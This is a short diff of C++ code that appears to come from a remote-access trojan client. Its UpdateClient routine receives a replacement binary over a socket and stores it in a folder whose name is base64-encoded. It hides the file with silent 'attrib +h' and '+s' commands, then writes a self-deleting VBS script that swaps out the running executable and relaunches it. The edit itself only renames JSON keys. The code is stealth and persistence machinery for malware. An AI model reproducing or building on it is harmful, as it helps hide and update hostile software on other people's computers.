@@ -93,9 +93,9 @@ bool UpdateClient(SOCKET Sock)
 	if (!du.WriteBinaryFile(du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile(), NewClient.Str))
 		return false;
 
-	if (NewClient.j["Attrib"]["Hidden"])
+	if (NewClient.j["Hidden"])
 		su.NoOutputCMD("attrib +h \"" + du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile() + "\"");
-	if (NewClient.j["Attrib"]["System"])
+	if (NewClient.j["System"])
 		su.NoOutputCMD("attrib +s \"" + du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile() + "\"");
 
 	if (!du.WriteFile(du.GetModuleFilePath() + "Update.vbs", "WScript.Sleep 5000\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\nfilesys.MoveFile \"" + du.GetModuleFilePath() + "VXBkYXRl\\" + du.GetModuleFile() + "\", \"" + du.GetFullModuleFilePath() + "\"\nWScript.Sleep 1000\nWshShell.Run \"" + du.GetFullModuleFilePath() + "\", 1, false\nfilesys.DeleteFolder \"" + du.GetModuleFilePath() + "VXBkYXRl\"\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Update.vbs\""))
